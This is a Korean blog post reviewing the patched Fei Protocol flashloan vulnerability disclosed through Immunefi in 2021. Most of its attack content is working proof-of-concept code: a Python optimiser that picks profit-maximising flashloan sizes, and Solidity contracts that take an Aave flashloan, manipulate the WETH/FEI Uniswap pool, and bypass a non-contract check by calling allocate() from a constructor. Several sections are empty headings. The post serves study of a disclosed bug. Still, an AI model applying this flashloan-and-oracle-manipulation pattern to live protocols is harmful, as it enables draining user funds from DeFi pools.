---
title:  "Immunefi Review: Fei Protocol Flashloan Vulnerability Postmortem 리뷰"
excerpt: "2021년 5월 2일에 Immuefi에 제보된 Alexander Schlindwein의 Fei Protocol Flashloan 취약점에 대한 리뷰입니다."
author: Panda
categories:
  - Security
  - Smart Contract
  - Vulnerability
tags:
  - Immunefi
  - Flashloan
  - Review
  - Korean
#last_modified_at: 2021-09-23 18:06:00 +09:00
date: 2022-08-02 7:00:00 +09:00
lastmod: 2022-08-02 7:00:00 +09:00
sitemap :
changefreq : daily
priority : 1.0

# table of contents
toc: true # 오른쪽 부분에 목차를 자동 생성해준다.
toc_label: "table of content" # toc 이름 설정
toc_icon: "bars" # 아이콘 설정
toc_sticky: true # 마우스 스크롤과 함께 내려갈 것인지 설정
use_math: true #수식
#{% figure caption:"Le logo de **Jekyll** et son clin d'oeil à Robert Louis Stevenson"
#  %}
#  ![Le logo de Jekyll]({{"/assets/images_posts/2021-09-23-cve-2021-31956-part1/1.png"| #relative_url}})
#{% endfigure %}
---
# Introudction
  * [Alexander Schlindwein](https://twitter.com/bobface16)이 2021년 5월 2일에 Immunefi에 제보한 취약점으로 Floshloan기반의 논리취약점. 
  * Alexander Schlindwein의 경우 다수의 DeFi관련 취약점을 제보한 실력이 높은 화이트해커로 DeFi업계에서 명성이 있는 것으로 주변분들의 얘기를 통해 알게됨.
  * 이 취약점 분석이 중요한 이유중 하나로 DeFi관련해서 취약점 분석시, 공격 코드가 공개된 블로그를 한 번도 확인하지 못 했는데, 해당 취약점의 경우 공격코드가 공개된 유일한 취약점 분석 블로그
  * Flashloan 취약점을 실제로 돌려볼 수 있는 소중한 기회라고 생각하고 자세히 분석할 필요성이 존재함

## Summary
  * flashloan 기능을 활용한 공격, 최대 60,000ETH 유출 가능
  * 21년 5월2일에 Alexander Schlindwein이 immuefi에 제보
  * Fei Protocol은 Alexander Schlindwein에게 $800,000 지급
  * 이후 Fei Protocol은 취약점에 대한 분석을 결과를 발표함

# Vulnerability
## Fei Protocol
  * 루나와 같은 알고리즘 스테이블 코인(Algorithmic Stablecoin)
  * Fei의 1달러 가치를 유지하기 위한 방법중 하나로 Protocol Controlled Value(PCV) 활용
  * PCV의 기본 방법은 유동성 공급을 통한 유니스왑(CPMM)의 ETH/FEI 쌍의 적절한 교환비를 유지하게 하여 안정적인 FEI 가치를 지속하게 함
  * ETH의 가치가 높으면 ETH를 ETH/FEI 풀에 공급, FEI가치가 상승하면 FEI를 공급, 어떻게 보면 ETH가 FEI의 담보 물건으로 볼 수 도 있음, 따라서 담보가 가치가 급하락해도 FEI의 1달러 유지를 위해 ETH를 공급해야함, 예 ETH가격이 400만원에서 200만원으로 줄어들었을 때 교환비는 그래로 이기 때문에, FEI의 가치가 0.5달러가 됨 이를 1달러로 끌어 올리기 위해 ETH를 2배 공급하면 ETH대비 FEI의 가치가 올라가게 되면 1달러에 가깝게 유지하게 됨
  * 유니스왑 풀에 적절한 ETH를 공급는 역활을 담당하는 것이 PCV임

## Whay Stablecoin?
  * 1달러 스테이블 코인을 찍어내는 것(민팅:Minting)은 1달러를 찍어내는 것과 같음
  * 가상자산 시장에서 즉 FRB가 되는 것, FEI 프로토콜의 경우 ETH가 계속 상승한다면 그 상승분 만큼 달러를 계속 찍어낼 수 있게 되는 것임. 시장의 신뢰만 얻는다면 스테이블코인 발행기관은 한국은행이 되는 것임 그리고 스테이블코인을 계속 발행함으로써 해당 기관은 세상에서 제일 부자가 될 수 있음
  * 달러를 무한히 찍어낼 수 있는 것의 힘(파괴력)은 클린턴 정부에서 금본위제도를 포기하고 나서의 미국 경제 버블 증가속도를 보면 됨, 스테이블코인은 시장의 신뢰가 필요함 미국은 미국이라는 나라가 절대 망하지 않는다는 사람들의 통념을 기반으로 무한히 돈을 찍어내는 것임, [M1 차트](https://fred.stlouisfed.org/series/M1SL) 참고
  * 여기서 ETH역할을 하는게 미국 국채이고 금본위제도 폐기는 최악의 경우에서도 달러 가치 유지를 위해 달러 발행량 만큼 담보로 금을 보유해야한다는 족쇄를 풀어준 것. 미국 금융권의 요구사항을 클린턴정부가 들어준 것이고, 클린턴 행정부가 들어준게 하나가 더 있는데, 일반 시중은행에서 금융상품을 다룰수 있게 해준것 원래는 우리나라 금산분리와 비슷한 취지로 미국도 투자은행과 시중은행의 역할를 엄하게 구분하고 있었음. 이 법안 폐지의 폐단이 들어난 사건이 미국의 서브프라임모기지 사태임. IMF로 우리나라의 중산층이 무너졌다면 서브프라임으로 미국의 중산층이 무너졌음.
  * 그리고 이게 더 문제인데 서브프라임사건으로 법적 책임을 진 사람이 아무도 없음. ㅎㅎㅎ
  * 딴 얘기를 너무 많이 했는데, 여기서 중요한 것은 스테이블코인이라는 것이 그 만큼 위험하다는 것과 적절한 담보자산을 가지지 않은 스테이블 코인은 가상자산 시장자체의 붕괴를 가져올 정도로 파괴력을 지닐 수 있다는 것

## Root Cause of Vulnerability Analysis(RCA)
Fei 프로토콜 취약점의 경우 기존 취약점관점에서 그 유형을 구분하자면 논리취약점(Logical Vulnerability)에 가깝다고 볼 수 있습니다. 가장 저변에 깔려있는 취약점의 원인은 크게 두가지 입니다.

* Flashloan : 담보없이 수천억원의 돈을 빌릴 수 있음
* CPMM(유니스왑)기반 price oracle을 활용한 Fei 가격 유지 알고리즘

이 것만으로는 피해가 제한적일 수가 있지만, 여기에 Fei 프로토콜내 ETH 수량을 조절하는 PCV내 [allocate()](https://github.com/fei-protocol/fei-protocol-core/blob/d8aebc2b119739ad1525d5c8861f2480d1610ddb/contracts/bondingcurve/BondingCurve.sol#L93)함수에 대한 임의호출 방법을 확보함으로써 취약점의 효과를 강화시켰고, 이부분은 Alexander Schlindwein의 실력에서 나온 것이라 판단됩니다. 왜냐하면 아래 그림과 1에서와 같이, Fei 프로토콜 서비스 출시전에 Allocate 함수를 패치 내역을 살펴보면 Exploit공격을 방어하기 위해 isContract를 확인하는 nonContract modifier를 사용했지만 Alexander는 우회했다는 것과 이 우회를 달성이 Alexander의 직관에 기반을 두고 착안되었을 가능성이 높기 때문입니다.

| ![Image Alt 텍스트]({{"/assets/images_post/2022-08-02-immunefi-fei-protocol-flashloan-review/allocate_patch.png"| relative_url}})  |
| ![Image Alt 텍스트]({{"/assets/images_post/2022-08-02-immunefi-fei-protocol-flashloan-review/nonContract.png"| relative_url}})  |
| 그림.1 Allocate함수의 패치 내역 및 nonContract Modifier |

## Exploit Scenario



## Maximize The Damage of Exploitation

```python
# This script calculates the optimal values for the exploit to achieve maximum profit.
# It uses GEKKO, a nonlinear (NLP) solver, to maximize the objective function while adhering to constraints.

from gekko import GEKKO

def main():
    # The GEKKO model
    m = GEKKO()   

    ############ CONSTANTS ############

    # `peg` is the current oracle price, used to calculate the amount of FEI
    # purchasable from the bonding curve for a given amount of ETH.
    peg = m.Param(value=3178.0327)            # peg: https://etherscan.io/address/0x7a165F8518A9Ec7d5DA15f4B77B1d7128B5D9188#readContract

    # `p0` is the amount of WETH in the FEI/WETH Uniswap V2 pool
    p0 = m.Param(value=141245.117)            # ETH in pool: https://etherscan.io/tokenholdings?a=0x94B0A3d511b6EcDb17eBF877278Ab030acb0A878

    # `p1` is the amount of FEI in the FEI/WETH Uniswap V2 pool
    p1 = m.Param(value=463938347)             # FEI in pool: https://etherscan.io/tokenholdings?a=0x94B0A3d511b6EcDb17eBF877278Ab030acb0A878

    ############# NLP VARS ############

    # `d` and `b` are the payload for the exploit and are the output of this calculation.
    #
    # `d`: The amount of WETH to dump on the Uniswap pool.
    # `b`: The amount of WETH to spend on the bonding curve to buy FEI.
    # 
    # The exploit will take a flash loan of `d + b` WETH.
    #
    # Both variables are initialized to 50000, otherwise the NLP gets stuck at a local maximum.
    d = m.Var(lb=0, value=50000)
    b = m.Var(lb=0, value=50000)

    # Flash loan providers, such as Aave, have a limited amount of WETH available.
    # Since the exploit will take a flash loan of `d + b` we need to limit the maximum allowed size.
    # The PoC uses Aave, which currently has approximately 700K WETH available.
    #
    # The higher the size of the possible flash loan, the higher the possible profit.
    # In a real-world scenario, an attacker would take flash loans from multiple parties
    # (Aave, dydx, various Uniswap V2 and V3 pools, etc.) to achieve the highest profit.
    #
    # For the PoC we are limited to Aave only. However, you can still run this calculation
    # with a higher flash loan limit by simply increasing the number below. Executing the PoC
    # with the resulting values will fail since it exceeds Aave's funds, however the NLP solver
    # will output the correct profit.
    m.Equation(d + b <= 700000)


    # Now, we begin building the equation which outputs the profit and which is to be maximized.

    # 1. Dump `d` WETH on the Uniswap FEI/WETH pool
    # The WETH in the pool is increased by `d`
    p0_d = p0 + d
    # The FEI in the pool is decreased according to Uniswap's x*y=k formula
    p1_d = (p0 * p1) / p0_d
    # The amount of FEI we receive is the difference between the pool's FEI balance before and after the dump
    r1_d = p1 - p1_d

    # 2. Buy FEI from bonding curve for a cost of `b` ETH.
    # We receive `b * peg` FEI in return for spending `b` ETH.
    r1_b = b * peg

    # 3. This is the `allocate()` call. The `EthUniswapPCVDeposit` deposits the PCV into Uniswap. The additionally required FEI is minted.
    # The amount of WETH in the pool is increased by `b`, which is the amount we spent in the previous step.
    p0_b = p0_d + b
    # The amount of FEI in the pool is increased according to Uniswap's x*y=k formula
    p1_b = p1_d * (p0_b / p0_d)

    # 4. Spend FEI received from step 1 and 2 to buy back ETH from the Uniswap pool
    # The amount of FEI in the pool is increased by the amount of FEI we received from step 1 and 2
    p1_f = p1_b + r1_d + r1_b
    # The amount of WETH is decreased according to Uniswap's x*y=k formula
    p0_f = (p0_b * p1_b) / p1_f
    # The amount of WETH we receive is the difference between the pool's WETH balance before and after the buyback
    r0_f = p0_b - p0_f

    # The total profit/loss is calculated as the WETH output from the previous step minus flash loan funds which need to be repaid.
    r0 = r0_f - d - b

    # Maximize the profit function
    m.Maximize(r0)

    # Run the solver
    m.options.IMODE = 3 # steady state optimization
    m.solve()

    print('')
    print('Results')
    # Objective is the final profit/loss in WETH.
    # Note that the result's sign is flipped when displayed on screen.
    # The reason therefore is that GEKKO can only minimize objectives.
    # However, we would like to maximize it.
    # So `m.Maximize(r0)` is converted to `m.Minimize(-r0)` under the hood.
    print('Objective: ' + str(m.options.objfcnval))
    # The best found value for `d`
    print('d: ' + str(d.value))
    # The best found value for `b`
    print('b: ' + str(b.value))


if __name__ == "__main__":
    main()
```

# Exploit Exercise


```JavaScript
//Allocate.sol
pragma solidity ^0.6.0;

import "../bondingcurve/IBondingCurve.sol";

contract Allocator {
    constructor(IBondingCurve bondingCurve) public {
        // We run this call from a constructor
        // to bypass the non-contract check of `allocate()`
        bondingCurve.allocate();
    }
}

//Exploit.sol
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "./IERC20.sol";
import "./IWETH.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2Router02.sol";
import "./IUpdateableOracle.sol";
import "./IAaveLendingPool.sol";
import "./IFlashLoanReceiver.sol";
import "../bondingcurve/IBondingCurve.sol";
import "../external/Decimal.sol";
import "./Allocator.sol";

import "hardhat/console.sol";

contract Exploit is IFlashLoanReceiver {

    IWETH private immutable WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private immutable FEI = IERC20(0x956F47F50A910163D8BF957Cf5846D573E7f87CA);

    IAaveLendingPool private immutable AAVE_LENDING_POOL = IAaveLendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    address public immutable override ADDRESSES_PROVIDER = 0xB53C1a33016B2DC2fF3653530bfF1848a515c8c5;
    address public immutable override LENDING_POOL = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;

    IUniswapV2Router02 private immutable ROUTER_02 = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Pair private immutable WETH_FEI_POOL = IUniswapV2Pair(0x94B0A3d511b6EcDb17eBF877278Ab030acb0A878);

    IUpdateableOracle private immutable UNISWAP_ORACLE = IUpdateableOracle(0x087F35bd241e41Fc28E43f0E8C58d283DD55bD65);
    IBondingCurve private immutable ETH_BONDING_CURVE = IBondingCurve(0xe1578B4a32Eaefcd563a9E6d0dc02a4213f673B7);

    uint private _aavePremium;
    uint private _d;
    uint private _b;

    function start(uint d, uint b) external {

        _d = d;
        _b = b;

        UNISWAP_ORACLE.update();
        console.log("Updated oracle");

        // 1. Get WETH flashloan from Aave
        address[] memory assets = new address[](1);
        assets[0] = address(WETH);
        uint[] memory amounts = new uint[](1);
        amounts[0] = d + b;
        uint[] memory modes = new uint[](1);
        modes[0] = 0;
        AAVE_LENDING_POOL.flashLoan(address(this), assets, amounts, modes, address(0), "", 0);

        // END - After Aave .flashLoan returns

        console.log("");
        console.log("##################################");
        console.log("ETH balance", WETH.balanceOf(address(this)), WETH.balanceOf(address(this)) / 10**18);
    }

    function dump() internal {
        // 2. Inbalance pool: dump ETH
        WETH.approve(address(ROUTER_02), _d);
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(FEI);
        ROUTER_02.swapExactTokensForTokens(_d, 1, path, address(this), uint(-1));
        console.log("Dumped", _d / 10**18, "ETH on WETH/FEI pool");

        buyFromBondingCurve();
    }

    function buyFromBondingCurve() internal { 
        // 3. Buy Fei on bonding curve
        WETH.withdraw(_b);
        ETH_BONDING_CURVE.purchase{value: _b}(address(this), _b);
        console.log("Bought Fei from bonding curve for", _b / 10**18, "ETH");

        allocate();
    }

    function allocate() internal {
        // 4. Allocate ETH from bonding curve purchase
        new Allocator(ETH_BONDING_CURVE);
        console.log("Allocated ETH from Fei protocol");

        buyback();
    }

    function buyback() internal {
        // 5. Buy WETH from WETH/FEI pool
        uint remainingBalance = FEI.balanceOf(address(this));
        FEI.approve(address(ROUTER_02), remainingBalance);
        address[] memory path = new address[](2);
        path[0] = address(FEI);
        path[1] = address(WETH);
        ROUTER_02.swapExactTokensForTokens(remainingBalance, 1, path, address(this), uint(-1));
        console.log("Swapped", remainingBalance / 10**18, "Fei on WETH/FEI pool");
        
        repayETH();
    }

    function repayETH() internal {
        // 6. Approve Aave for flashloan payback
        WETH.approve(address(AAVE_LENDING_POOL), _d + _b + _aavePremium);
    }

    function executeOperation(address[] calldata assets, uint256[] calldata amounts, uint256[] calldata premiums, address initiator, bytes calldata params) external override returns (bool) {
        _aavePremium = premiums[0];
        console.log("Received WETH flashloan with premium", _aavePremium / 10**18);
        dump();
        console.log("Repaying ETH flashloan");
        return true;
    }

    receive() external payable {}
}
```

# Discussion

# Conclusion

# References
* [https://medium.com/immunefi/fei-protocol-flashloan-vulnerability-postmortem-7c5dc001affb](https://medium.com/immunefi/fei-protocol-flashloan-vulnerability-postmortem-7c5dc001affb)
* [https://medium.com/fei-protocol/fei-bonding-curve-bug-post-mortem-98d2c6f271e9](https://medium.com/fei-protocol/fei-bonding-curve-bug-post-mortem-98d2c6f271e9)
* [https://medium.com/immunefi/a-guide-to-reproducing-ethereum-exploits-fei-protocol-224b30b517d6](https://medium.com/immunefi/a-guide-to-reproducing-ethereum-exploits-fei-protocol-224b30b517d6)
* [https://github.com/fei-protocol/fei-protocol-core/pull/81/commits/f10a43d91fce77fe1d03f7914483120698aabc72](https://github.com/fei-protocol/fei-protocol-core/pull/81/commits/f10a43d91fce77fe1d03f7914483120698aabc72)
* [https://www.quicknode.com/guides/web3-sdks/how-to-fork-ethereum-mainnet-with-hardhat](https://www.quicknode.com/guides/web3-sdks/how-to-fork-ethereum-mainnet-with-hardhat)
* [https://docs.alchemy.com/alchemy/introduction/getting-started](https://docs.alchemy.com/alchemy/introduction/getting-started)
* [https://docs.soliditylang.org/en/v0.7.4/using-the-compiler.html#input-description](https://docs.soliditylang.org/en/v0.7.4/using-the-compiler.html#input-description)
* 
